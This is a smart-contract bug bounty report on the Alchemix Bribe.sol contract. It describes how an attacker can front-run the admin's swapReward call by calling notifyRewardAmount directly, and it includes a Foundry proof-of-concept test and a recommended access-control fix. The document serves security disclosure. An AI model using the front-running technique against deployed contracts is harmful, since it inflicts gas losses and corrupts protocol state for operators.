# 30613 - \[SC - Medium] malicious user can front run any call to the sw\...

Submitted on May 2nd 2024 at 03:23:54 UTC by @zeroK for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30613

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

the function `voter.sol#swapReward` is meant to be used to update the reward token from old one to new one, this function is only callable by the admin and it make calls to the `Bribe.sol#swapOutRewardToken` which it updates the `isReward` from false to true for the newToken, and it set the old token index to the newToken address, however an attacker can front run the owner and cause Griefing plus preventing from setting the correct index to the newToken address, this issue can make loss to the owner by front run his/her TX and cause loss of gas + making the rewards length longer each time the attacker front run the owner call and preventing setting the correct index to the new token that the owner decide to set.

## Vulnerability Details

to call the swapReward function the owner first need to call the whitelist function to add the new token to whitelist, if not then the call to the swapReward is impossible because of the checks for the whitelist token the function `swapReward` make call to the swapOutRewardToken with the below inputs:

```solidity
 function swapReward(address gaugeAddress, uint256 tokenIndex, address oldToken, address newToken) external {
        require(msg.sender == admin, "only admin can swap reward tokens");
        IBribe(bribes[gaugeAddress]).swapOutRewardToken(tokenIndex, oldToken, newToken);
    }
```

as it shown the tokenIndex is set to update the token index when call made to the `swapOutRewardToken`:

```solidity
 function swapOutRewardToken(uint256 oldTokenIndex, address oldToken, address newToken) external {
        require(msg.sender == voter, "Only voter can execute");
        require(IVoter(voter).isWhitelisted(newToken), "New token must be whitelisted");
        require(rewards[oldTokenIndex] == oldToken, "Old token mismatch");

        // Check that the newToken does not already exist in the rewards array
        for (uint256 i = 0; i < rewards.length; i++) {
            require(rewards[i] != newToken, "New token already exists");
        }

        isReward[oldToken] = false;
        isReward[newToken] = true;

        // Since we've now ensured the new token doesn't exist, we can safely update
        rewards[oldTokenIndex] = newToken; // set the old index to the new token
```

however, malicious user can front run the owner call to the `swapReward` the moment that he/she realized that a new token added to the whitelist lists by calling the `notifyRewardAmount` directly from the bribe.sol contract, while this contract is external and allow anyone call it directly the malicious user can call it with the new whitelisted token address before the admin call and the notifyRewardAmount function will not set the correct index to the new token when call made to the `_addRewardToken`(it did not set index to it) and increase the `rewards` list :

```solidity

function notifyRewardAmount(address token, uint256 amount) external lock {
        require(amount > 0, "reward amount must be greater than 0");

        // If the token has been whitelisted by the voter contract, add it to the rewards list
        require(IVoter(voter).isWhitelisted(token), "bribe tokens must be whitelisted");
        _addRewardToken(token);

        // bribes kick in at the start of next bribe period
        uint256 adjustedTstamp = getEpochStart(block.timestamp);
        uint256 epochRewards = tokenRewardsPerEpoch[token][adjustedTstamp];

        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        tokenRewardsPerEpoch[token][adjustedTstamp] = epochRewards + amount;
        periodFinish[token] = adjustedTstamp + DURATION;

        emit NotifyReward(msg.sender, token, adjustedTstamp, amount);
    }

function _addRewardToken(address token) internal {
        if (!isReward[token] && token != address(0)) {
            require(rewards.length < MAX_REWARD_TOKENS, "too many rewards tokens");
            require(IVoter(voter).isWhitelisted(token), "bribe tokens must be whitelisted");

            isReward[token] = true;
            rewards.push(token); // if the old index is 5 then we give the new token index 6 not 5, push increase the index
        }
    }
```

according to our calculation the amount of gas that the admin will loss according to this case is more than the amount that the malicious user need to front run the admin with tiny \`amount.

## Impact Details

malicious user can front run admin call to the `swapReward` and cause loss of gas to the admin + setting incorrect index to the new token that get added

## Recommend

we recommend to prevent any direct call to the `notifyRewardAmount` function in the bribe.sol and adding `require(msg.sender == voter)` to prevent this case which leads to Griefing.

## Proof of Concept

run the test file below in src/test

```solidity
// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.15;

import "./BaseTest.sol";

import "lib/forge-std/src/console2.sol";
import "lib/forge-std/src/Test.sol";
import "./utils/DSTestPlus.sol";

import "src/VotingEscrow.sol";
import "src/AlchemixGovernor.sol";
import "src/FluxToken.sol";
import "src/Voter.sol";
import "src/Minter.sol";
import "src/RewardPoolManager.sol";
import "src/RewardsDistributor.sol";
import "src/RevenueHandler.sol";
import "src/Bribe.sol";
import "src/gauges/CurveGauge.sol";
import "src/gauges/PassthroughGauge.sol";
import "src/governance/TimelockExecutor.sol";
import "src/factories/BribeFactory.sol";
import "src/factories/GaugeFactory.sol";

import "src/interfaces/aura/MockCurveGaugeFactory.sol";
import "src/interfaces/IAlchemixToken.sol";
import "src/interfaces/IMinter.sol";
import "src/interfaces/balancer/WeightedPool2TokensFactory.sol";
import "src/interfaces/balancer/WeightedPoolUserData.sol";
import "src/interfaces/balancer/IVault.sol";
import "src/interfaces/IWETH9.sol";
import "src/gauges/StakingRewards.sol";
import "src/interfaces/aura/IRewardPool4626.sol";

contract testing is Test, BaseTest {
    uint256 public fakeToken;
    address public alice;

    IERC20 public usdd = IERC20(0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6);
    function setUp() public {
        setupContracts(block.timestamp);

        alice = vm.addr(1);
        deal(address(usdd), address(alice), 1 ether);
    }

    function test_attack() public {
        address bribeAddress = voter.bribes(address(sushiGauge));
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        hevm.startPrank(address(timelockExecutor));

        voter.whitelist(address(usdd));
        vm.startPrank(alice);
        usdd.approve(address(voter), type(uint256).max);
        usdd.approve(address(bribeAddress), type(uint256).max);

        IBribe(bribeAddress).notifyRewardAmount(address(usdd), 1000000000000000000);

        hevm.startPrank(address(timelockExecutor));
        // vm.expectRevert();
        voter.swapReward(address(sushiGauge), 0, dai, address(usdd));
    }
}


```
